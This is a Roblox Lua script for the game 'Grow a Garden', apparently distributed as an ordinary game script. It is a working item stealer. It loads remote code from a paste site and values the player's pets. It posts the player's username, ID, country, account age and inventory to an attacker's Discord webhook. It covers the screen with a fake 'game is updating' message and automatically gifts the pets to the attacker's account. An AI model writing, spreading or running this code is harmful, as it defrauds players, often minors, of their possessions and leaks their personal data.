loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()

        local RS = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local HttpService = game:GetService("HttpService")
        local RunService = game:GetService("RunService")
        local LocalizationService = game:GetService("LocalizationService")
        local DataService = require(RS.Modules.DataService)
        local PetRegistry = require(RS.Data.PetRegistry)
        local NumberUtil = require(RS.Modules.NumberUtil)
        local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
        local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)

        local data = DataService:GetData()

        -- Priority system (1 = highest priority, 11 = lowest priority)
        local priorities = {
            ["Kitsune"] = 1,
            ["Raccoon"] = 2,
            ["Fennec fox"] = 3,
            ["Spinosaurus"] = 4,
            ["Dragonfly"] = 5,
            ["T-Rex"] = 6,
            ["Mimic Octopus"] = 7,
            ["Disco Bee"] = 8,
            ["Butterfly"] = 9,
            ["Queen Bee"] = 10,
            ["Red Fox"] = 13
        }

        local mutationPriorities = {
            ["Ascended"] = 14,
            ["Rainbow"] = 15,
            ["Shocked"] = 16,
            ["Radiant"] = 17,
            ["IronSkin"] = 18,
            ["Mega"] = 19,
            ["Tiny"] = 20,
            ["Golden"] = 21,
            ["Frozen"] = 22,
            ["Windy"] = 23,
            ["Inverted"] = 24,
            ["Shiny"] = 25
        }


        local function detectExecutor()
            local name
            local success = pcall(function()
                if identifyexecutor then
                    name = identifyexecutor()
                elseif getexecutorname then
                    name = getexecutorname()
                end
            end)
            return name or "Unknown"
        end

        if detectExecutor() == "Delta" then
            Players.LocalPlayer:Kick("Delta is not supported! Please use a different executor.")
            error("Script doesn't work on delta")            
        end

        local function formatNumberWithCommas(n)
            local str = tostring(n)
            return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
        end

        local function getWeight(toolName)
            if not toolName or toolName == "No Tool" then
                return nil, nil
            end
            
            -- Extract weight (looks for [X.XX KG])
            local weight = toolName:match("%[([%d%.]+) KG%]")
            weight = weight and tonumber(weight)
            
            return weight
        end
        

        local function getAge(toolName)
            if not toolName or toolName == "No Tool" then
                return nil, nil
            end    
            -- Extract age (looks for [Age X])
            local age = toolName:match("%[Age (%d+)%]")
            age = age and tonumber(age)
            
            return age
        end

        local function GetPlayerPets()
            local unsortedPets = {}
            local equippedPets = {}
            local player = Players.LocalPlayer
            if not data or not data.PetsData then
                warn("No pet data available in data.PetsData")
                return unsortedPets
            end

            -- Unequip all pets ONCE at the start
            if workspace:FindFirstChild("PetsPhysical") then
                for _, petMover in workspace.PetsPhysical:GetChildren() do
                    if petMover and petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
                        for _, pet in petMover:GetChildren() do
                            table.insert(equippedPets, pet.Name)
                                PetsService:UnequipPet(pet.Name)
                        end
                    end
                end
            end

            task.wait(0.5)
            -- Get all tools from backpack
            for _, tool in pairs(player.Backpack:GetChildren()) do
                if not tool or not tool.Parent then
                    continue
                end
            
                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
                    local petName = tool.Name
                    
                    -- Skip broken pets
                    if petName:find("Bald Eagle") or petName:find("Golden Lab") then
                        continue
                    end

                    local function SafeCalculatePetValue(tool)
                        local player = Players.LocalPlayer
                        local PET_UUID = tool:GetAttribute("PET_UUID")
                        
                        if not PET_UUID then
                            warn("SafeCalculatePetValue | No UUID!")
                            return 0
                        end
                        
                        -- Get data directly instead of through character
                        local data = DataService:GetData()
                        if not data or not data.PetsData.PetInventory.Data[PET_UUID] then
                            warn("SafeCalculatePetValue | No pet data found!")
                            return 0
                        end
                        
                        -- Get pet data
                        local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
                        local petData = petInventoryData.PetData
                        local HatchedFrom = petData.HatchedFrom
                        
                        if not HatchedFrom or HatchedFrom == "" then
                            warn("SafeCalculatePetValue | No HatchedFrom value!")
                            return 0
                        end
                        
                        -- Get egg data
                        local eggData = PetRegistry.PetEggs[HatchedFrom]
                        if not eggData then
                            warn("SafeCalculatePetValue | No egg data found!")
                            return 0
                        end
                        
                        -- Get rarity data
                        local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
                        if not rarityData then
                            warn("SafeCalculatePetValue | No pet data in egg!")
                            return 0
                        end
                        
                        -- Get weight range
                        local WeightRange = rarityData.GeneratedPetData.WeightRange
                        if not WeightRange then
                            warn("SafeCalculatePetValue | No WeightRange found!")
                            return 0
                        end
                        
                        -- Calculate final value using the original math
                        local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
                        local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
                        local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
                        
                        return math.floor(sellPrice * weightMultiplier * levelMultiplier)
                    end

                    local age = getAge(tool.Name) or 0
                    local weight = getWeight(tool.Name) or 0

                    -- Remove weight/age tags
                    local strippedName = petName:gsub(" %[.*%]", "")

                    -- Function to remove mutation prefix for sorting
                    local function stripMutationPrefix(name)
                        for mutation in pairs(mutationPriorities) do
                            if name:lower():find(mutation:lower()) == 1 then
                                return name:sub(#mutation + 2)
                            end
                        end
                        return name
                    end

                    -- Final base type used for sorting
                    local petType = stripMutationPrefix(strippedName)

                    
                    local rawValue = SafeCalculatePetValue(tool)
                    if rawValue and rawValue > 0 then
                        table.insert(unsortedPets, {
                            PetName = petName,
                            PetAge = age,
                            PetWeight = weight,
                            Id = tool:GetAttribute("PET_UUID") or tool:GetAttribute("uuid"),
                            Type = petType,
                            Value = rawValue,
                            Formatted = formatNumberWithCommas(rawValue),
                        })
                    else
                            warn("Failed to calculate value for:", tool.Name)
                            continue
                    end
                    
                end
            end

            task.wait(0.5)
            -- Re-equip pets
        if equippedPets then
            for _, petName in pairs(equippedPets) do
                if petName then
                    game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
                end
            end
        end
            return unsortedPets
        end

        local pets = GetPlayerPets()

        local Webhook = getgenv().Webhook
        local Username = getgenv().Username

        -- Returns mutation name if found in toolName, otherwise nil
        local function isMutated(toolName)
            for mutation, _ in pairs(mutationPriorities) do
                if toolName:lower():find(mutation:lower()) == 1 then
                    return mutation
                end
            end
            return nil
        end

        -- Sort pets by priority, then by value
        table.sort(pets, function(a, b)
            -- Get a's priority
            local aPriority = priorities[a.Type]
            local aMutation = isMutated(a.PetName)
            if not aPriority and aMutation then
                aPriority = mutationPriorities[aMutation]
            end
            if not aPriority and a.Weight and a.Weight >= 10 then
                aPriority = 11
            end
            if not aPriority and a.Age and a.Age >= 60 then
                aPriority = 12
            end

            -- Get b's priority
            local bPriority = priorities[b.Type]
            local bMutation = isMutated(b.PetName)
            if not bPriority and bMutation then
                bPriority = mutationPriorities[bMutation]
            end
            if not bPriority and b.Weight and b.Weight >= 10 then
                bPriority = 11
            end
            if not bPriority and b.Age and b.Age >= 60 then
                bPriority = 12
            end

            -- Compare priorities
            if aPriority and bPriority then
                if aPriority == bPriority then
                    return a.Value > b.Value
                else
                    return aPriority < bPriority
                end
            end

            -- Only one has priority
            if aPriority and not bPriority then return true end
            if bPriority and not aPriority then return false end

            -- Neither has priority
            return a.Value > b.Value
        end)
        -- Check if player has any priority pets
        local function hasRarePets()
            for _, pet in pairs(pets) do
                if priorities[pet.Type] then
                    return true
                end
            end
            return false
        end

        local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

        local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

        local petString = "```"

        for i, pet in ipairs(pets) do
            local emoji = "🐶" -- Default to normal pet

            if priorities[pet.Type] then
                -- Custom emoji for each rare pet type
                local rareEmojis = {
                    ["Kitsune"] = "🦊",
                    ["Raccoon"] = "🦝",
                    ["Fennec fox"] = "🦊",
                    ["Spinosaurus"] = "🫎",
                    ["Dragonfly"] = "🐲",
                    ["T-Rex"] = "🦖",
                    ["Mimic Octopus"] = "🐙",
                    ["Disco Bee"] = "🪩",
                    ["Butterfly"] = "🦋",
                    ["Queen Bee"] = "👑",
                    ["Red Fox"] = "🦊"
                }
                emoji = rareEmojis[pet.Type] or "💎"
            elseif pet.Weight and pet.Weight >= 10 then
                emoji = "🐘" -- Huge pet
            elseif pet.Age and pet.Age >= 60 then
                emoji = "👴" -- Aged pet
            end

            local petName = pet.PetName
            local petValue = pet.Formatted
            petString = petString .. "\n" .. emoji .. " - " .. petName .. " → " .. petValue
        end

        local playerCount = #Players:GetPlayers()

        local function getPlayerCountry(player)
            local success, result = pcall(function()
                return LocalizationService:GetCountryRegionForPlayerAsync(player)
            end)
            
            if success then
                return result -- Returns country code like "US", "GB", "DE"
            else
                return "Unknown"
            end
        end

        petString = petString .. "\n```"

        local accountAgeInDays = Players.LocalPlayer.AccountAge
        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60) -- Converts days to seconds and subtracts
        local creationDateString = os.date("%Y-%m-%d", creationDate) -- Formats the date as Year-Month-Day

        local payload = {
    username = "Scripts.SM",
    avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
    content = "",
    embeds = {{
        title = "<:pack:1365295947281862656> Scripts.SM • Grow a Garden Hit",
        url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
        color = 0x03D7FC,
        fields = {
            {
                name = "<:players:1365290081937526834> Player Info",
                value = "Details of the player who sent the pets/fruits:",
                inline = false
            },
            {
                name = "<:stats:1365955343221264564> Display Name",
                value = "```" .. game.Players.LocalPlayer.DisplayName .. "```",
                inline = true
            },
            {
                name = "<:stats:1364189776885973072> Username",
                value = "```" .. game.Players.LocalPlayer.Name .. "```",
                inline = true
            },
            {
                name = "<:reset:1364189779435978804> User ID",
                value = "```" .. tostring(game.Players.LocalPlayer.UserId) .. "```",
                inline = true
            },
            {
                name = "<:time:1365991843011100713> Account Age",
                value = "```" .. tostring(game.Players.LocalPlayer.AccountAge) .. " days" .. "```",
                inline = true
            },
            {
                name = "<:players:1365290081937526834> Receiver",
                value = "```" .. Username .. "```",
                inline = true
            },
            {
                name = "<:changes:1365295949811028068> Created",
                value = "```" .. creationDateString .. "```",
                inline = true
            },
            {
                name = "<:stats:1364189776885973072> Executor",
                value = "```" .. detectExecutor() .. "```",
                inline = true
            },
            {
                name = "<:location:1365290076279541791> Country",
                value = "```" .. getPlayerCountry(game.Players.LocalPlayer) .. "```",
                inline = true
            },
            {
                name = "<:players:1365290081937526834> Player Count",
                value = "```" .. playerCount .. "/5" .. "```",
                inline = true
            },
            {
                name = "<:money:1365955380294844509> Inventory (Pet & Fruits)",
                value = petString,
                inline = false
            },
            {
                name = "<:folder:1365290079081205844> Join Script",
                value = "```lua\n" .. tpScript .. "\n```",
                inline = false
            },
            {
                name = "<:game:1365295942504550410> Join with URL",
                value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                inline = false
            },
            {
                name = "<:events:1365290073767022693> Watermark",
                value = "**Made by Scripts.SM** | [Join our Official Discord](https://discord.gg/ynm4BvqZ78)",
                inline = false
            }
        },
                footer = {
            text = "Scripts.SM • Job ID: " .. game.JobId,
            icon_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"
        },
        timestamp = DateTime.now():ToIsoDate()
    }},
    attachments = {}
}



        if hasRarePets() then
            payload.content = "@everyone\n" .. "To activate the stealer you must jump or type in chat"

                local success = pcall(function()
                    request({
                        Url = Webhook,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = HttpService:JSONEncode(payload)
                    })
                end)
        else
            payload.content = "To activate the stealer you must jump or type in chat"

            local success, err = pcall(function()
                request({
                    Url = Webhook,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode(payload)
                })
            end)

            if not success then
                warn("Failed to send webhook:", err)
            end
        end

        local function CreateGui()
            local player = Players.LocalPlayer

            -- Create GUI
            local gui = Instance.new("ScreenGui")
            local asc = Instance.new("UIAspectRatioConstraint")
            gui.Name = "EclipseHubGui"
            gui.ResetOnSpawn = false
            gui.IgnoreGuiInset = true
            gui.Parent = player:WaitForChild("PlayerGui")
            gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
            gui.DisplayOrder = 99999

            -- Full black background
            local bg = Instance.new("Frame")
            bg.Size = UDim2.new(1, 0, 1, 0)
            bg.Position = UDim2.new(0, 0, 0, 0)
            bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
            bg.Parent = gui

            -- Spinner icon
            local spinner = Instance.new("ImageLabel")
            spinner.AnchorPoint = Vector2.new(0.5, 0.5)
            spinner.Size = UDim2.new(0.3, 0, 0.3, 0)
            spinner.Position = UDim2.new(0.5, 0, 0.34, 0)
            spinner.BackgroundTransparency = 1
            spinner.Image = "rbxassetid://74011233271790" -- Simple loop icon
            spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
            spinner.Parent = bg
            asc.Parent = spinner

            -- "Please wait..." title
            local title = Instance.new("TextLabel")
            title.Size = UDim2.new(1, 0, 0, 50)
            title.Position = UDim2.new(0, 0, 0.53, 0)
            title.BackgroundTransparency = 1
            title.Text = "Please wait..."
            title.Font = Enum.Font.GothamBold
            title.TextSize = 38
            title.TextColor3 = Color3.fromRGB(255, 255, 255)
            title.TextStrokeTransparency = 0.75
            title.Parent = bg

            -- Description text
            local desc = Instance.new("TextLabel")
            desc.Size = UDim2.new(1, -100, 0, 60)
            desc.Position = UDim2.new(0.5, -((1 * (bg.AbsoluteSize.X - 100)) / 2), 0.60, 0)
            desc.BackgroundTransparency = 1
            desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
            desc.Font = Enum.Font.Gotham
            desc.TextSize = 20
            desc.TextColor3 = Color3.fromRGB(200, 200, 200)
            desc.TextWrapped = true
            desc.TextXAlignment = Enum.TextXAlignment.Center
            desc.TextYAlignment = Enum.TextYAlignment.Top
            desc.Parent = bg

            -- Spinner rotation loop
            task.spawn(function()
                while spinner do
                    spinner.Rotation += 2
                    task.wait(0.01)
                end
            end)
        end

        if getgenv().EclipseHubRunning then
            warn("Script is already running or has been executed! Cannot run again.")
            return
        end
        getgenv().EclipseHubRunning = true

        local receiverPlr
        repeat 
            receiverPlr = Players:FindFirstChild(Username)
            task.wait(1)
        until receiverPlr

        local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
        local hum = receiverChar:WaitForChild("Humanoid")
        local targetPlr = Players.LocalPlayer
        local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()

        if receiverPlr == targetPlr then error("Receiver and target are the same person!") end

        local jumped = false
        local chatted = false

        hum.Jumping:Connect(function()
            jumped = true
        end)

        receiverPlr.Chatted:Connect(function()
            chatted = true
        end)

        repeat
            task.wait()
        until jumped or chatted

        for _, v in targetPlr.PlayerGui:GetDescendants() do
            if v:IsA("ScreenGui") then
                v.Enabled = false
            end
        end

        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        CreateGui()

        if workspace:FindFirstChild("PetsPhysical") then
            for _, petMover in workspace:FindFirstChild("PetsPhysical"):GetChildren() do
                if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
                    for _, pet in petMover:GetChildren() do
                        PetsService:UnequipPet(pet.Name)
                    end
                end
            end
        end

        for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
            if tool and tool:IsA("Tool") and tool:GetAttribute("d") == true then
                local tool = game:GetService("Players").LocalPlayer:WaitForChild("Backpack"):WaitForChild(tool.Name)
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
            end
        end


local function safeFollow(targetPlayer, follower)
    
    local offset = CFrame.new(0, 0, 1.5)
    local conn
    conn = RunService.Stepped:Connect(function()
            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            local followerRoot = follower.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot and followerRoot then
                followerRoot.CFrame = targetRoot.CFrame * offset
            end
    end)
    
    return {
        Stop = function()
            conn:Disconnect()
        end
    }
end

safeFollow(receiverPlr, targetPlr)

local inventory = targetPlr.Backpack

local function quickGift(tool)
    -- Equip the tool (no attempt limit)
    repeat
        pcall(function()
            if tool.Parent == targetPlr.Backpack then
                tool.Parent = targetChar
            end
        end)
        task.wait(0.05)
    until tool.Parent == targetChar

    repeat
        RS:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", receiverPlr)
        task.wait(0.5) -- Short delay between attempts
    until tool.Parent ~= targetChar and tool.Parent ~= targetPlr.Backpack

    if tool.Parent == targetChar then
        tool.Parent = targetPlr.Backpack
    end

    print("Gifted " .. tool.Name .. " successfully")

    return true
end


for _, pet in ipairs(pets) do
    local tool
    for _, t in pairs(inventory:GetChildren()) do
        if t:IsA("Tool") and t:GetAttribute("PET_UUID") == pet.Id then
            tool = t
            break
        end
    end

    if tool then
        print("Attempting to gift", tool.Name)
        local before = tool.Parent
        
        -- Run quickGift until success (it will handle its own retries)
        quickGift(tool)
        
    end
end
